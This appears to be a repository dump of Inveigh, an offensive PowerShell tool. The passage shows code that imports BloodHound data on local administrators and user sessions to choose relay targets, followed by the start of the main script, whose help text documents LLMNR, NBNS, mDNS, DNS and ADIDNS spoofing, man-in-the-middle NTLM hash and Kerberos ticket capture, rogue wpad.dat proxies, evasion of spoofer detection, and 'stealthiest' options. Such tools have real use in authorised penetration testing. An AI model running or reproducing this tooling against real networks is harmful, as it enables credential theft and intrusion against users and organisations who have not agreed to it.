($IP,$Hostname,$DNSDomain,$netBIOSDomain,$Sessions,$AdministratorUsers,$AdministratorGroups,\n            $Privileged,$Shares,$NetSessions,$NetSessionsMapped,$LocalUsers,$SMB2,$Signing,$SMBServer,$DNSRecord,\n            $IPv6Only,$Targeted,$Enumerate,$Execute)\n\n        if($Sessions -and $Sessions -isnot [Array]){$Sessions = @($Sessions)}\n        if($AdministratorUsers -and $AdministratorUsers -isnot [Array]){$AdministratorUsers = @($AdministratorUsers)}\n        if($AdministratorGroups -and $AdministratorGroups -isnot [Array]){$AdministratorGroups = @($AdministratorGroups)}\n        if($Privileged -and $Privileged -isnot [Array]){$Privileged = @($Privileged)}\n        if($Shares -and $Shares -isnot [Array]){$Shares = @($Shares)}\n        if($NetSessions -and $NetSessions -isnot [Array]){$NetSessions = @($NetSessions)}\n        if($NetSessionsMapped -and $NetSessionsMapped -isnot [Array]){$NetSessionsMapped = @($NetSessionsMapped)}\n        if($LocalUsers -and $LocalUsers -isnot [Array]){$LocalUsers = @($LocalUsers)}\n\n        $relay_object = New-Object PSObject\n        Add-Member -InputObject $relay_object -MemberType NoteProperty -Name \"Index\" $inveigh.enumerate.Count\n        Add-Member -InputObject $relay_object -MemberType NoteProperty -Name \"IP\" $IP\n        Add-Member -InputObject $relay_object -MemberType NoteProperty -Name \"Hostname\" $Hostname\n        Add-Member -InputObject $relay_object -MemberType NoteProperty -Name \"DNS Domain\" $DNSDomain\n        Add-Member -InputObject $relay_object -MemberType NoteProperty -Name \"netBIOS Domain\" $netBIOSDomain\n        Add-Member -InputObject $relay_object -MemberType NoteProperty -Name \"Sessions\" $Sessions\n        Add-Member -InputObject $relay_object -MemberType NoteProperty -Name \"Administrator Users\" $AdministratorUsers\n        Add-Member -InputObject $relay_object -MemberType NoteProperty -Name \"Administrator Groups\" $AdministratorGroups\n        Add-Member -InputObject $relay_object -MemberType NoteProperty -Name \"Privileged\" $Privileged\n        Add-Member -InputObject $relay_object -MemberType NoteProperty -Name \"Shares\" $Shares\n        Add-Member -InputObject $relay_object -MemberType NoteProperty -Name \"NetSessions\" $NetSessions\n        Add-Member -InputObject $relay_object -MemberType NoteProperty -Name \"NetSessions Mapped\" $NetSessionsMapped\n        Add-Member -InputObject $relay_object -MemberType NoteProperty -Name \"Local Users\" $LocalUsers\n        Add-Member -InputObject $relay_object -MemberType NoteProperty -Name \"SMB2.1\" $SMB2\n        Add-Member -InputObject $relay_object -MemberType NoteProperty -Name \"Signing\" $Signing\n        Add-Member -InputObject $relay_object -MemberType NoteProperty -Name \"SMB Server\" $SMBServer\n        Add-Member -InputObject $relay_object -MemberType NoteProperty -Name \"DNS Record\" $DNSRecord\n        Add-Member -InputObject $relay_object -MemberType NoteProperty -Name \"IPv6 Only\" $IPv6Only\n        Add-Member -InputObject $relay_object -MemberType NoteProperty -Name \"Targeted\" $Targeted\n        Add-Member -InputObject $relay_object -MemberType NoteProperty -Name \"Enumerate\" $Enumerate\n        Add-Member -InputObject $relay_object -MemberType NoteProperty -Name \"Execute\" $Execute\n        \n        return $relay_object\n    }\n\n    function Get-DNSEntry([String]$hostname)\n    {\n\n        try\n        {\n            $IP_list = [System.Net.Dns]::GetHostEntry($hostname)\n\n            foreach($entry in $IP_list.AddressList)\n            {\n\n                if(!$entry.IsIPv6LinkLocal)\n                {\n                    $IP = $entry.IPAddressToString\n                }\n\n            }\n                    \n        }\n        catch\n        {\n            $IP = $null\n        }\n\n        return $IP\n    }\n\n    # JSON parsing from http://wahlnetwork.com/2016/03/15/deserializing-large-json-payloads-powershell-objects/ \n    function Invoke-ParseItem($JSONItem) \n    {\n\n        if($JSONItem.PSObject.TypeNames -match 'Array') \n        {\n            return Invoke-ParseJsonArray($JSONItem)\n        }\n        elseif($JSONItem.PSObject.TypeNames -match 'Dictionary') \n        {\n            return Invoke-ParseJsonObject([HashTable]$JSONItem)\n        }\n        else \n        {\n            return $JSONItem\n        }\n\n    }\n\n    function Invoke-ParseJsonObject($JSONObject) \n    {\n        $result = New-Object -TypeName PSCustomObject\n\n        foreach($key in $JSONObject.Keys) \n        {\n            $item = $JSONObject[$key]\n\n            if ($item) \n            {\n                $parsed_item = Invoke-ParseItem $item\n            }\n            else \n            {\n                $parsed_item = $null\n            }\n\n            $result | Add-Member -MemberType NoteProperty -Name $key -Value $parsed_item\n        }\n\n        return $result\n    }\n\n    function Invoke-ParseJSONArray($JSONArray) \n    {\n        $result = @()\n        $stopwatch_progress = [System.Diagnostics.Stopwatch]::StartNew()\n        $i = 0\n\n        $JSONArray | ForEach-Object -Process {\n\n            if($stopwatch_progress.Elapsed.TotalMilliseconds -ge 500)\n            {\n                $percent_complete_calculation = [Math]::Truncate($i / $JSONArray.count * 100)\n\n                if($percent_complete_calculation -le 100)\n                {\n                    Write-Progress -Activity \"Parsing JSON\" -Status \"$percent_complete_calculation% Complete:\" -PercentComplete $percent_complete_calculation -ErrorAction SilentlyContinue\n                }\n\n                $stopwatch_progress.Reset()\n                $stopwatch_progress.Start()\n            }\n\n            $i++\n            $result += , (Invoke-ParseItem $_)}\n\n        return $result\n    }\n\n    function Invoke-ParseJSONString($json) \n    {\n        $config = $javaScriptSerializer.DeserializeObject($json)\n\n        return Invoke-ParseJsonObject $config\n    }\n\n    [void][System.Reflection.Assembly]::LoadWithPartialName(\"System.Web.Extensions\")\n\n    if($inveigh.enumerate.Count -eq 0)\n    {\n        $enumerate_empty = $true\n    }\n\n    if($Computers)\n    {       \n        $Computers = (Resolve-Path $Computers).Path\n        $computers_serializer = New-Object -TypeName System.Web.Script.Serialization.JavaScriptSerializer\n        $computers_serializer.MaxJsonLength = 104857600\n        $bloodhound_computers = [System.IO.File]::ReadAllText($Computers)\n        $bloodhound_computers = $computers_serializer.DeserializeObject($bloodhound_computers)\n        Write-Output \"[*] Parsing BloodHound Computers JSON\"\n        $stopwatch_parse = [System.Diagnostics.Stopwatch]::StartNew()\n        $bloodhound_computers = Invoke-ParseItem $bloodhound_computers\n        Write-Output \"[+] Parsing completed in $([Math]::Truncate($stopwatch_parse.Elapsed.TotalSeconds)) seconds\"\n        $stopwatch_parse.Reset()\n        $stopwatch_parse.Start()\n        Write-Output \"[*] Importing computers to Inveigh\"\n        $stopwatch_progress = [System.Diagnostics.Stopwatch]::StartNew()\n        $i = 0\n\n        if(!$bloodhound_computers.Computers)\n        {\n            Write-Output \"[!] JSON computers parse failed\"\n            throw\n        }\n\n        $bloodhound_computers.Computers | ForEach-Object {\n\n            if($stopwatch_progress.Elapsed.TotalMilliseconds -ge 500)\n            {\n                $percent_complete_calculation = [Math]::Truncate($i / $bloodhound_computers.Computers.Count * 100)\n\n                if($percent_complete_calculation -le 100)\n                {\n                    Write-Progress -Activity \"[*] Importing computers\" -Status \"$percent_complete_calculation% Complete:\" -PercentComplete $percent_complete_calculation -ErrorAction SilentlyContinue\n                }\n\n                $stopwatch_progress.Reset()\n                $stopwatch_progress.Start()\n            }\n\n            $hostname = $_.Name\n            [Array]$local_admin_users = $_.LocalAdmins | Where-Object {$_.Type -eq 'User'} | Select-Object -expand Name\n            [Array]$local_admin_groups = $_.LocalAdmins | Where-Object {$_.Type -eq 'Group'} | Select-Object -expand Name\n\n            if($DNS)\n            {\n                $IP = Get-DNSEntry $hostname\n\n                if(!$IP)\n                {\n                    Write-Output \"[-] DNS lookup for $Hostname failed\"\n                }\n\n            }\n\n            if(!$enumerate_empty)\n            {\n\n                for($i = 0;$i -lt $inveigh.enumerate.Count;$i++)\n                {\n\n                    if(($hostname -and $inveigh.enumerate[$i].Hostname -eq $hostname) -or ($IP -and $inveigh.enumerate[$i].IP -eq $IP))\n                    {\n\n                        if($inveigh.enumerate[$i].Hostname -ne $hostname -and $inveigh.enumerate[$i].IP -eq $IP)\n                        {\n\n                            for($j = 0;$j -lt $inveigh.enumerate.Count;$j++)\n                            {\n\n                                if($inveigh.enumerate[$j].IP -eq $target)\n                                {\n                                    $target_index = $j\n                                    break\n                                }\n\n                            }\n\n                            $inveigh.enumerate[$target_index].Hostname = $hostname\n                        }\n                        else\n                        {\n\n                            for($j = 0;$j -lt $inveigh.enumerate.Count;$j++)\n                            {\n\n                                if($inveigh.enumerate[$j].Hostname -eq $hostname)\n                                {\n                                    $target_index = $j\n                                    break\n                                }\n\n                            }\n\n                        }\n\n                        $inveigh.enumerate[$target_index].\"Administrator Users\" = $local_admin_users\n                        $inveigh.enumerate[$target_index].\"Administrator Groups\" = $local_admin_groups\n                    }\n                    else\n                    {\n                        $inveigh.enumerate.Add((New-RelayEnumObject -Hostname $_.Name -IP $IP -AdministratorUsers $local_admin_users -AdministratorGroups $local_admin_groups)) > $null\n                    }\n\n                }\n\n            }\n            else\n            {\n                $inveigh.enumerate.Add((New-RelayEnumObject -Hostname $_.Name -IP $IP -AdministratorUsers $local_admin_users -AdministratorGroups $local_admin_groups)) > $null\n            }\n\n            $IP = $null\n            $hostname = $null\n            $local_admin_users = $null\n            $local_admin_groups = $null\n            $target_index = $null\n            $i++\n        }\n\n        Write-Output \"[+] Import completed in $([Math]::Truncate($stopwatch_parse.Elapsed.TotalSeconds)) seconds\"\n        $stopwatch_parse.Reset()\n        Remove-Variable bloodhound_computers\n    }\n\n    if($Sessions)\n    {\n        $Sessions = (Resolve-Path $Sessions).Path\n        $sessions_serializer = New-Object -TypeName System.Web.Script.Serialization.JavaScriptSerializer\n        $sessions_serializer.MaxJsonLength = 104857600\n        $bloodhound_sessions = [System.IO.File]::ReadAllText($Sessions)\n        $bloodhound_sessions = $sessions_serializer.DeserializeObject($bloodhound_sessions)\n        $stopwatch_parse = [System.Diagnostics.Stopwatch]::StartNew()\n        Write-Output \"[*] Parsing BloodHound Sessions JSON\"\n        $bloodhound_sessions = Invoke-ParseItem $bloodhound_sessions\n        Write-Output \"[+] Parsing completed in $([Math]::Truncate($stopwatch_parse.Elapsed.TotalSeconds)) seconds\"\n        $stopwatch_parse.Reset()\n        $stopwatch_parse.Start()\n        Write-Output \"[*] Importing sessions to Inveigh\"\n        $stopwatch_progress = [System.Diagnostics.Stopwatch]::StartNew()\n        $i = 0\n\n        if(!$bloodhound_sessions.Sessions)\n        {\n            Write-Output \"[!] JSON sessions parse failed\"\n            throw\n        }\n\n        $bloodhound_sessions.Sessions | ForEach-Object {\n            \n            if($stopwatch_progress.Elapsed.TotalMilliseconds -ge 500)\n            {\n                $percent_complete_calculation = [Math]::Truncate($i / $bloodhound_sessions.Sessions.Count * 100)\n\n                if($percent_complete_calculation -le 100)\n                {\n                    Write-Progress -Activity \"[*] Importing sessions\" -Status \"$percent_complete_calculation% Complete:\" -PercentComplete $percent_complete_calculation -ErrorAction SilentlyContinue\n                }\n\n                $stopwatch_progress.Reset()\n                $stopwatch_progress.Start()\n            }\n\n            $hostname = $_.ComputerName\n\n            if($hostname -as [IPAddress] -as [Bool])\n            {\n                $IP = $hostname\n                $hostname = $null\n\n                for($i = 0;$i -lt $inveigh.enumerate.Count;$i++)\n                {\n\n                    if($inveigh.enumerate[$i].IP -eq $target)\n                    {\n                        $target_index = $i\n                        break\n                    }\n\n                }\n\n            }\n            else\n            {\n                for($i = 0;$i -lt $inveigh.enumerate.Count;$i++)\n                {\n\n                    if($inveigh.enumerate[$i].Hostname -eq $hostname)\n                    {\n                        $target_index = $i\n                        break\n                    }\n\n                }\n\n                if($DNS)\n                {\n                    $IP = Get-DNSEntry $hostname\n\n                    if(!$IP)\n                    {\n                        Write-Output \"[-] DNS lookup for $Hostname failed or IPv6 address\"\n                    }\n\n                }\n\n            }\n\n            if(!$enumerate_empty -or $target_index -ge 0)\n            {\n                [Array]$session_list = $inveigh.enumerate[$target_index].Sessions\n\n                if($session_list -notcontains $_.UserName)\n                {\n                    $session_list += $_.UserName\n                    $inveigh.enumerate[$target_index].Sessions = $session_list\n                }\n\n            }\n            else\n            {   \n                $inveigh.enumerate.Add($(New-RelayEnumObject -Hostname $hostname -IP $IP -Sessions $_.UserName)) > $null\n            }\n\n            $hostname = $null\n            $IP = $null\n            $session_list = $null\n            $target_index = $null\n            $i++\n        }\n\n        Write-Output \"[+] Import completed in $([Math]::Truncate($stopwatch_parse.Elapsed.TotalSeconds)) seconds\"\n        $stopwatch_parse.Reset()\n        Remove-Variable bloodhound_sessions\n    }\n    \n    if($Groups)\n    {\n        $Groups = (Resolve-Path $Groups).Path\n        $groups_serializer = New-Object -TypeName System.Web.Script.Serialization.JavaScriptSerializer\n        $groups_serializer.MaxJsonLength = 104857600\n        $bloodhound_groups = [System.IO.File]::ReadAllText($Groups)\n        $bloodhound_groups = $groups_serializer.DeserializeObject($bloodhound_groups)\n        $stopwatch_parse = [System.Diagnostics.Stopwatch]::StartNew()\n        Write-Output \"[*] Parsing BloodHound Groups JSON\"\n        $bloodhound_groups = Invoke-ParseItem $bloodhound_groups\n        Write-Output \"[+] Parsing completed in $([Math]::Truncate($stopwatch_parse.Elapsed.TotalSeconds)) seconds\"\n        $stopwatch_parse.Reset()\n        $stopwatch_parse.Start()\n        Write-Output \"[*] Importing groups to Inveigh\"\n        $stopwatch_progress = [System.Diagnostics.Stopwatch]::StartNew()\n        $i = 0\n\n        if(!$bloodhound_groups.Groups)\n        {\n            Write-Output \"[!] JSON groups parse failed\"\n            throw\n        }\n        \n        $bloodhound_groups.Groups | ForEach-Object {\n\n            if($stopwatch_progress.Elapsed.TotalMilliseconds -ge 500)\n            {\n                $percent_complete_calculation = [Math]::Truncate($i / $bloodhound_groups.Groups.Count * 100)\n\n                if($percent_complete_calculation -le 100)\n                {\n                    Write-Progress -Activity \"[*] Importing groups\" -Status \"$percent_complete_calculation% Complete:\" -PercentComplete $percent_complete_calculation -ErrorAction SilentlyContinue\n                }\n\n                $stopwatch_progress.Reset()\n                $stopwatch_progress.Start()\n            }\n\n            [Array]$group_members = $_.Members | Select-Object -expand MemberName\n            $inveigh.group_table.Add($_.Name,$group_members)\n            $group_members = $null\n            $i++\n        }\n\n        Write-Output \"[+] Import completed in $([Math]::Truncate($stopwatch.Elapsed.TotalSeconds)) seconds\"\n    }\n\n}\n\n#endregion"
        },
        {
          "name": "Inveigh.ps1",
          "type": "blob",
          "size": 296.087890625,
          "content": "function Invoke-Inveigh\n{\n<#\n.SYNOPSIS\nThis function is a Windows PowerShell ADIDNS/LLMNR/NBNS/mDNS/DNS spoofer.\n\n.DESCRIPTION\nThis function is a Windows PowerShell ADIDNS/LLMNR/NBNS/mDNS/DNS spoofer/man-in-the-middle tool with\nchallenge/response capture over HTTP/HTTPS/Proxy/SMB.\n\n.PARAMETER ADIDNS\nDefault = None: (Combo/NS/Wildcard) List of ADIDNS spoofing attacks. Combo looks at LLMNR/NBNS requests and adds\na record to DNS if the same request is received from multiple systems. NS injects an NS record and if needed, a target record.\nThis is primarily for the GQBL bypass for wpad. This attack can be used with Inveigh's DNS spoofer. Wildcard injects a wildcard record.\n\n.PARAMETER ADIDNSACE\nDefault = Enabled: Enable/Disable adding an 'Authenticated Users' full control ACE to any added records.\n\n.PARAMETER ADIDNSCleanup\nDefault = Enabled: Enable/Disable removing added ADIDNS records upon shutdown.\n\n.PARAMETER ADIDNSCredential\nPSCredential object that will be used with ADIDNS spoofing.\n\n.PARAMETER ADIDNSDomain\nThe targeted domain in DNS format.\n\n.PARAMETER ADIDNSDomainController\nDomain controller to target. This parameter is mandatory on a non-domain attached system.\n\n.PARAMETER ADIDNSForest\nThe targeted forest in DNS format.\n\n.PARAMETER ADIDNSHostsIgnore\nComma separated list of hosts that will be ignored with ADIDNS spoofing.\n\n.PARAMETER ADIDNSNSTarget\nDefault = wpad2: Target for the NS attacks NS record. An existing record can be used. \n\n.PARAMETER ADIDNSPartition\nDefault = DomainDNSZones: (DomainDNSZones,ForestDNSZones,System) The AD partition name where the zone is stored.\n\n.PARAMETER ADIDNSThreshold\nDefault = 4: The threshold used to determine when ADIDNS records are injected for the combo attack. Inveigh will\ntrack identical LLMNR and NBNS requests received from multiple systems. DNS records will be injected once the\nsystem count for identical LLMNR and NBNS requests exceeds the threshold.\n\n.PARAMETER ADIDNSTTL\nDefault = 600 Seconds: DNS TTL in seconds for added A records.\n\n.PARAMETER ADIDNSZone\nThe ADIDNS zone.\n\n.PARAMETER Challenge\nDefault = Random: 16 character hex NTLM challenge for use with the HTTP listener. If left blank, a random\nchallenge will be generated for each request.\n\n.PARAMETER ConsoleOutput\nDefault = Disabled: (Low/Medium/Y/N) Enable/Disable real time console output. If using this option through a\nshell, test to ensure that it doesn't hang the shell. Medium and Low can be used to reduce output.\n\n.PARAMETER ConsoleQueueLimit\nDefault = Unlimited: Maximum number of queued up console log entries when not using the real time console. \n\n.PARAMETER ConsoleStatus\n(Integer) Interval in minutes for displaying all unique captured usernames, hashes, and credentials. This is useful for\ndisplaying full capture lists when running through a shell that does not have access to the support functions.\n\n.PARAMETER ConsoleUnique\nDefault = Enabled: (Y/N) Enable/Disable displaying challenge/response hashes for only unique IP, domain/hostname,\nand username combinations when real time console output is enabled.\n\n.PARAMETER DNS\nDefault = Enabled: (Y/N) Enable/Disable DNS spoofing. All detected requests will be answered with the SpooferIP.\nThis is primarily required for the ADIDNS NS wpad attack.\n\n.PARAMETER DNSTTL\nDefault = 30 Seconds: DNS TTL in seconds for the response packet.\n\n.PARAMETER Elevated\nDefault = Auto: (Auto/Y/N) Set the privilege mode. Auto will determine if Inveigh is running with\nelevated privilege. If so, options that require elevated privilege can be used.\n\n.PARAMETER EvadeRG\nDefauly = Disabled: (Y/N) Enable/Disable detecting and ignoring LLMNR/NBNS requests sent directly to an IP address\nrather than a broadcast/multicast address. This technique is used by ResponderGuard to discover spoofers across\nsubnets.\n\n.PARAMETER FileOutput\nDefault = Disabled: (Y/N) Enable/Disable real time file output.\n\n.PARAMETER FileOutputDirectory\nDefault = Working Directory: Valid path to an output directory for log and capture files. FileOutput must\nalso be enabled.\n\n.PARAMETER FileUnique\nDefault = Enabled: (Y/N) Enable/Disable outputting challenge/response hashes for only unique IP, domain/hostname,\nand username combinations when real time file output is enabled.\n\n.PARAMETER HTTP\nDefault = Enabled: (Y/N) Enable/Disable HTTP challenge/response capture.\n\n.PARAMETER HTTPIP\nDefault = Any: IP address for the HTTP/HTTPS listener.\n\n.PARAMETER HTTPPort\nDefault = 80: TCP port for the HTTP listener.\n\n.PARAMETER HTTPAuth\nDefault = NTLM: (Anonymous/Basic/NTLM/NTLMNoESS) HTTP/HTTPS listener authentication type. This setting does not\napply to wpad.dat requests. NTLMNoESS turns off the 'Extended Session Security' flag during negotiation. \n\n.PARAMETER HTTPBasicRealm\nRealm name for Basic authentication. This parameter applies to both HTTPAuth and WPADAuth.\n\n.PARAMETER HTTPContentType\nDefault = text/html: Content type for HTTP/HTTPS/Proxy responses. Does not apply to EXEs and wpad.dat. Set to\n\"application/hta\" for HTA files or when using HTA code with HTTPResponse.\n\n.PARAMETER HTTPDirectory\nFull directory path to enable hosting of basic content through the HTTP/HTTPS listener.\n\n.PARAMETER HTTPDefaultFile\nFilename within the HTTPDirectory to serve as the default HTTP/HTTPS/Proxy response file. This file will not be used for\nwpad.dat requests.\n\n.PARAMETER HTTPDefaultEXE\nEXE filename within the HTTPDirectory to serve as the default HTTP/HTTPS/Proxy response for EXE requests. \n\n.PARAMETER HTTPResponse\nContent to serve as the default HTTP/HTTPS/Proxy response. This response will not be used for wpad.dat requests.\nThis parameter will not be used if HTTPDirectory is set. Use PowerShell character escapes and newlines where necessary.\n\n.PARAMETER HTTPS\nDefault = Disabled: (Y/N) Enable/Disable HTTPS challenge/response capture. Warning, a cert will be installed in\nthe local store. If the script does not exit gracefully, manually remove the certificate. This feature requires\nlocal administrator access.\n\n.PARAMETER HTTPSPort\nDefault = 443: TCP port for the HTTPS listener.\n\n.PARAMETER HTTPSCertIssuer\nDefault = Inveigh: The issuer field for the cert that will be installed for HTTPS.\n\n.PARAMETER HTTPSCertSubject\nDefault = localhost: The subject field for the cert that will be installed for HTTPS.\n\n.PARAMETER HTTPSForceCertDelete\nDefault = Disabled: (Y/N) Force deletion of an existing certificate that matches HTTPSCertIssuer and\nHTTPSCertSubject.\n\n.PARAMETER Inspect\n(Switch) Inspect DNS/LLMNR/mDNS/NBNS traffic only.\n\n.PARAMETER IP\nLocal IP address for listening and packet sniffing. This IP address will also be used for LLMNR/NBNS/mDNS/DNS spoofing\nif the SpooferIP parameter is not set.\n\n.PARAMETER Kerberos\nDefault = Disabled: (Y/N) Enable/Disable experimental Kerberos TGT capture and kirbi file output through unconstrained\ndelegation and packet sniffing. \n\n.PARAMETER KerberosCount\nDefault = 2: The number of kirbi files that will be created per username.\n\n.PARAMETER KerberosCredential\nCredentials that will be used to decrypt Kerberos TGT captures. This is not required if using KerberosHash. The username\nshould be entered in Kerberos salt format:\nAD username format = uppercase realm + case sensitive username (e.g., TEST.LOCALusername, TEST.LOCALAdministrator)\nAD hostname format = uppercase realm + the word host + lowercase hostname without the trailing '$' + . + lowercase\nrealm (e.g., TEST.LOCALhostwks1.test.local)\n\n.PARAMETER KerberosHash\nAES256 password hash that will be used to decrypt Kerberos TGT captures. This is not required if using KerberosCredential.\n\n.PARAMETER KerberosHostHeader\nComma separated list of hosts that the HTTP/HTTPS/Proxy listener will compare to host headers. If a match is found, the\nlistener will attempt to negotiate to Kerberos.\n\n.PARAMETER LogOutput\nDefault = Enabled: (Y/N) Enable/Disable storing log messages in memory.\n\n.PARAMETER LLMNR\nDefault = Enabled: (Y/N) Enable/Disable LLMNR spoofing.\n\n.PARAMETER LLMNRTTL\nDefault = 30 Seconds: LLMNR TTL in seconds for the response packet.\n\n.PARAMETER MachineAccounts\nDefault = Disabled: (Y/N) Enable/Disable showing NTLM challenge/response captures from machine accounts.\n\n.PARAMETER mDNS\nDefault = Disabled: (Y/N) Enable/Disable mDNS spoofing.\n\n.PARAMETER mDNSTTL\nDefault = 120 Seconds: mDNS TTL in seconds for the response packet.\n\n.PARAMETER mDNSTypes\nDefault = QU: Comma separated list of mDNS types to spoof. Note that QM will send the response to 224.0.0.251.\nTypes include QU = Query Unicast, QM = Query Multicast\n\n.PARAMETER NBNS\nDefault = Disabled: (Y/N) Enable/Disable NBNS spoofing.\n\n.PARAMETER NBNSBruteForce\nDefault = Disabled: (Y/N) Enable/Disable NBNS brute force spoofer.\n\n.PARAMETER NBNSBruteForceHost\nDefault = WPAD: Hostname for the NBNS Brute Force spoofer.\n\n.PARAMETER NBNSBruteForcePause\nDefault = Disabled: (Integer) Number of seconds the NBNS brute force spoofer will stop spoofing after an incoming\nHTTP request is received.\n\n.PARAMETER NBNSBruteForceTarget\nIP address to target for NBNS brute force spoofing.\n\n.PARAMETER NBNSTTL\nDefault = 165 Seconds: NBNS TTL in seconds for the response packet.\n\n.PARAMETER NBNSTypes\nDefault = 00,20: Comma separated list of NBNS types to spoof. Note, not all types have been tested.\nTypes include 00 = Workstation Service, 03 = Messenger Service, 20 = Server Service, 1B = Domain Name\n\n.PARAMETER OutputStreamOnly\nDefault = Disabled: (Y/N) Enable/Disable forcing all output to the standard output stream. This can be helpful if\nrunning Inveigh through a shell that does not return other output streams. Note that you will not see the various\nyellow warning messages if enabled.\n\n.PARAMETER Pcap\nDefault = Disabled: (File/Memory) Enable/Disable dumping packets to a pcap file or memory. This option requires\nelevated privilege. If using 'Memory', the packets will be written to the $inveigh.pcap ArrayList.\n\n.PARAMETER PcapTCP\nDefault = 139,445: Comma separated list of TCP ports to filter which packets will be written to the pcap file.\nUse 'All' to capture on all ports.\n\n.PARAMETER PcapUDP\nDefault = Disabled: Comma separated list of UDP ports to filter which packets will be written to the pcap file.\nUse 'All' to capture on all ports.\n\n.PARAMETER Proxy\nDefault = Disabled: (Y/N) Enable/Disable proxy listener authentication captures.\n\n.PARAMETER ProxyAuth\nDefault = NTLM: (Basic/NTLM/NTLMNoESS) Proxy listener authentication type.\n\n.PARAMETER ProxyIP\nDefault = Any: IP address for the proxy listener.\n\n.PARAMETER ProxyPort\nDefault = 8492: TCP port for the proxy listener.\n\n.PARAMETER ProxyIgnore\nDefault = Firefox: Comma separated list of keywords to use for filtering browser user agents. Matching browsers\nwill not be sent the wpad.dat file used for capturing proxy authentications. Firefox does not work correctly\nwith the proxy server failover setup. Firefox will be left unable to connect to any sites until the proxy is\ncleared. Remove 'Firefox' from this list to attack Firefox. If attacking Firefox, consider setting\n-SpooferRepeat N to limit attacks against a single target so that victims can recover Firefox connectivity by\nclosing and reopening.\n\n.PARAMETER RunCount\nDefault = Unlimited: (Integer) Number of NTLMv1/NTLMv2/cleartext captures to perform before auto-exiting.\n\n.PARAMETER RunTime\n(Integer) Run time duration in minutes.\n\n.PARAMETER ShowHelp\nDefault = Enabled: (Y/N) Enable/Disable the help messages at startup.\n\n.PARAMETER SMB\nDefault = Enabled: (Y/N) Enable/Disable SMB challenge/response capture. Warning, LLMNR/NBNS spoofing can still\ndirect targets to the host system's SMB server. Block TCP ports 445/139 or kill the SMB services if you need to\nprevent login requests from being processed by the Inveigh host.  \n\n.PARAMETER SpooferHostsIgnore\nComma separated list of requested hostnames to ignore when spoofing with LLMNR/mDNS/NBNS.\n\n.PARAMETER SpooferHostsReply\nComma separated list of requested hostnames to respond to when spoofing with LLMNR/mDNS/NBNS.\n\n.PARAMETER SpooferIP\nIP address for ADIDNS/LLMNR/mDNS/NBNS spoofing. This parameter is only necessary when redirecting victims to a system\nother than the Inveigh host.\n\n.PARAMETER SpooferIPsIgnore\nComma separated list of source IP addresses to ignore when spoofing with LLMNR/mDNS/NBNS.\n\n.PARAMETER SpooferIPsReply\nComma separated list of source IP addresses to respond to when spoofing with LLMNR/mDNS/NBNS.\n\n.PARAMETER SpooferLearning\nDefault = Disabled: (Y/N) Enable/Disable LLMNR/NBNS valid host learning. If enabled, Inveigh will send out\nLLMNR/NBNS requests for any received LLMNR/NBNS requests. If a response is received, Inveigh will add the\nhostname to a spoofing blacklist.\n\n.PARAMETER SpooferLearningDelay\n(Integer) Time in minutes that Inveigh will delay spoofing while valid hosts are being blacklisted through\nSpooferLearning.\n\n.PARAMETER SpooferLearningInterval\nDefault = 30 Minutes: (Integer) Time in minutes that Inveigh wait before sending out an LLMNR/NBNS request for a\nhostname that has already been checked if SpooferLearning is enabled.   \n\n.PARAMETER SpooferNonprintable\nDefault = Enabled: (Y/N) Enable/Disable answering LLMNR/NBNS requests for non-printable host names.\n\n.PARAMETER SpooferRepeat\nDefault = Enabled: (Y/N) Enable/Disable repeated LLMNR/NBNS spoofs to a victim system after one user\nchallenge/response has been captured.\n\n.PARAMETER SpooferThresholdHost\n(Integer) Number of matching LLMNR/NBNS name requests to receive before Inveigh will begin responding to those\nrequests.\n\n.PARAMETER SpooferThresholdNetwork\n(Integer) Number of matching LLMNR/NBNS requests to receive from different systems before Inveigh will begin\nresponding to those requests. \n\n.PARAMETER StartupChecks\nDefault = Disabled: (Y/N) Enable/Disable checks for in use ports and running services on startup.\n\n.PARAMETER StatusOutput\nDefault = Enabled: (Y/N) Enable/Disable startup and shutdown messages.\n\n.PARAMETER Tool\nDefault = 0: (0/1/2) Enable/Disable features for better operation through external tools such as Meterpreter's\nPowerShell extension, Metasploit's Interactive PowerShell Sessions payloads and Empire.\n0 = None, 1 = Metasploit/Meterpreter, 2 = Empire   \n\n.PARAMETER WPADAuth\nDefault = NTLM: (Anonymous/Basic/NTLM/NTLMNoESS) HTTP/HTTPS listener authentication type for wpad.dat requests.\nSetting to Anonymous can prevent browser login prompts. NTLMNoESS turns off the 'Extended Session Security' flag\nduring negotiation.\n\n.PARAMETER WPADAuthIgnore\nDefault = Firefox: Comma separated list of keywords to use for filtering browser user agents. Matching browsers\nwill be skipped for NTLM authentication. This can be used to filter out browsers that display login\npopups for authenticated wpad.dat requests such as Firefox.   \n\n.PARAMETER WPADDirectHosts\nComma separated list of hosts to list as direct in the wpad.dat file. Listed hosts will not be routed through the\ndefined proxy.\n\n.PARAMETER WPADIP\nProxy server IP to be included in the wpad.dat response for WPAD enabled browsers. This parameter must be used\nwith WPADPort.\n\n.PARAMETER WPADPort\nProxy server port to be included in the wpad.dat response for WPAD enabled browsers. This parameter must be\nused with WPADIP.\n\n.PARAMETER WPADResponse\nDefault = all direct: wpad.dat file contents to serve as the wpad.dat response. This parameter will not be used if WPADIP and WPADPort\nare set. Use PowerShell character escapes where necessary.\n\n.EXAMPLE\nImport-Module .\\Inveigh.psd1;Invoke-Inveigh\nImport full module and execute with all default settings.\n\n.EXAMPLE\n. ./Inveigh.ps1;Invoke-Inveigh -IP 192.168.1.10\nDot source load and execute specifying a specific local listening/spoofing IP.\n\n.EXAMPLE\nInvoke-Inveigh -IP 192.168.1.10 -HTTP N\nExecute specifying a specific local listening/spoofing IP and disabling HTTP challenge/response.\n\n.EXAMPLE\nInvoke-Inveigh -SpooferRepeat N -WPADAuth Anonymous -SpooferHostsReply host1,host2 -SpooferIPsReply 192.168.2.75,192.168.2.76\nExecute with the stealthiest options.\n\n.EXAMPLE\nInvoke-Inveigh -Inspect\nExecute in order to only inspect LLMNR/mDNS/NBNS traffic.\n\n.EXAMPLE\nInvoke-Inveigh -IP 192.168.1.10 -SpooferIP 192.168.2.50 -HTTP N\nExecute specifying a specific local listening IP and a LLMNR/NBNS spoofing IP on another subnet. This may be\nuseful for sending traffic to a controlled Linux system on another subnet.\n\n.EXAMPLE\nInvoke-Inveigh -HTTPResponse \"<html><head><meta http-equiv='refresh' content='0; url=https://duckduckgo.com/'></head></html>\"\nExecute specifying an HTTP redirect response. \n\n.LINK\nhttps://github.com/Kevin-Robertson/Inveigh\n#>\n\n#region begin parameters\n\n# Parameter default values can be modified in this section: \n[CmdletBinding()]\nparam\n( \n    [parameter(Mandatory=$false)][Array]$ADIDNSHostsIgnore = (\"isatap\",\"wpad\"),\n    